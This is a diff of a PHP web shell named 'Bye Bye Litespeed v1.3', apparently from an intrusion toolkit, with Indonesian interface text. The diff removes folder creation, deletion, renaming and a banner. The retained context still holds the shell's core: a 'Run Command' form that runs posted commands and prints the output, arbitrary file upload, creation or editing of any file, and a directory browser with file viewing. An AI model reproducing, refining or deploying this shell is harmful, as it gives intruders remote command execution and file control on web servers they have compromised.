@@ -182,14 +182,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         } else {
             echo "Sorry, there was an error uploading your file.";
         }
-    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
-        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
-        if (!file_exists($newFolder)) {
-            mkdir($newFolder);
-            echo '<hr>Folder created successfully!';
-        } else {
-            echo '<hr>Error: Folder already exists!';
-        }
     } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
         $fileName = $_POST['file_name'];
         $newFile = $currentDirectory . '/' . $fileName;
@@ -239,38 +231,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
-echo '<center>
-<div class="fig-ansi">
-<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  __    Bye Bye Litespeed   _____ __    
-    __|  |___ ___ ___ ___ ___   |   __|  | v.1.3
-|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
-|_____|__,|_  |___|__,|_|_|  |_____|_____|
-                |___| ./Heartzz                      </strong> </span></pre>
-</div>
-</center>';
 echo "Zona waktu server: " . $timezone . "<br>";
 echo "Waktu server saat ini: " . date('Y-m-d H:i:s');
 echo '<hr>Curdir: ';
 
-$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
-$currentPath = '';
-$homeLinkPrinted = false;
-foreach ($directories as $index => $dir) {
-    $currentPath .= DIRECTORY_SEPARATOR . $dir;
-    if ($index == 0) {
-        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
-    } else {
-        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
-    }
-}
-
-echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
 echo '<br>';
-echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
-echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
-echo '<input type="submit" value="Create Folder">';
-echo '</form>';
-echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
+echo '<hr><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
 echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
 echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
 echo '<input type="submit" value="Create / Edit File">';
@@ -281,7 +247,7 @@ echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pili
 echo '<hr>';
 echo '<input type="submit" value="Upload File" name="submit">';
 echo '</form>';
-echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
+echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
 echo $viewCommandResult;
 echo '<div>';
 echo '</div>';
@@ -290,38 +256,17 @@ echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</t
 foreach (scandir($currentDirectory) as $v) {
     $u = realpath($v);
     $s = stat($u);
-    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
     $permission = substr(sprintf('%o', fileperms($u)), -4);
     $writable = is_writable($u);
     echo '<tr>
-            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
-            <td class="size">'.filesize($u).'</td>
-            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
-            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
-            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View "></form></td>
-            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete"></form></td>
-            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+            <td class="item-name">' . htmlspecialchars($v) . '</td>
+            <td class="size">' . filesize($u) . '</td>
+            <td class="date" style="text-align: center;">' . date('Y-m-d H:i:s', filemtime($u)) . '</td>
+            <td class="permission ' . ($writable ? 'writable' : 'not-writable') . '">' . $permission . '</td>
+            <td><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '"><input type="submit" value=" View "></form></td>
         </tr>';
 }
-
 echo '</table>';
-function deleteDirectory($dir) {
-    if (!file_exists($dir)) {
-        return true;
-    }
-    if (!is_dir($dir)) {
-        return unlink($dir);
-    }
-    foreach (scandir($dir) as $item) {
-        if ($item == '.' || $item == '..') {
-            continue;
-        }
-        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
-            return false;
-        }
-    }
-    return rmdir($dir);
-}
 ?>
 </div>
 </body>
